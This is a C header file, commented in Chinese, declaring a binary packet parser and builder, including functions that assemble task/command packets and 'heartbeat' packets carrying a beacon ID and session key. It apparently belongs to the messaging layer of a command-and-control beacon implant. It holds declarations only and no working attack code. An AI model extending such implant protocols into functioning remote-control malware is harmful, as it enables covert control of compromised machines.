#pragma once

#include "beacon_common.h"

/* 用于读取结构化数据的二进制数据包解析器 */
typedef struct Parser {
    const BYTE8* data;          /* 数据指针 */
    SIZE_T len;                 /* 数据总长度 */
    SIZE_T off;                 /* 当前读取偏移 */
    CHAR error[128];            /* 错误信息（空表示无错误） */
} Parser;

/* ===== 解析器（读取） ===== */

/* 在原始数据缓冲区上初始化解析器 */
VOID ParserInit(Parser* p, const BYTE8* data, SIZE_T len);

/* 返回解析器中未消费的字节数 */
SIZE_T ParserLeft(const Parser* p);

/* 读取大端序 uint32 */
UINT32 ParserU32(Parser* p);

/* 读取大端序 uint64 */
UINT64 ParserU64(Parser* p);

/* 读取长度前缀字节块到新 ByteBuf（调用方负责释放） */
ByteBuf ParserBytes(Parser* p);

/* 读取长度前缀字符串（调用方负责 HeapFree） */
CHAR* ParserString(Parser* p);

/* ===== 构建器（写入） ===== */

/* 追加原始字节 */
INT PacketArrayBytes(ByteBuf* out, const VOID* data, SIZE_T len);

/* 追加长度前缀字符串 */
INT PacketArrayString(ByteBuf* out, const CHAR* value);

/* 追加 int16（大端序） */
INT PacketArrayI16(ByteBuf* out, int16_t value);

/* 追加 int32（大端序） */
INT PacketArrayI32(ByteBuf* out, int32_t value);

/* 追加布尔值（单字节 1 或 0） */
INT PacketArrayBool(ByteBuf* out, INT value);

/* 将原始字节打包为长度前缀 ByteBuf */
ByteBuf PacketPackBytesData(const VOID* data, SIZE_T len);

/* 将现有 ByteBuf 打包为长度前缀 ByteBuf */
ByteBuf PacketPackBytes(const ByteBuf* in);

/* 构建最终数据包：task_id + command_id + payload */
ByteBuf PacketMakeFinal(UINT32 task_id, UINT32 command_id, const ByteBuf* payload);

/* 构建心跳数据包：beacon_id + session_key + metadata */
ByteBuf PacketPackHeartbeat(UINT32 beacon_id, const BYTE8* session_key, SIZE_T session_key_len, const ByteBuf* metadata);
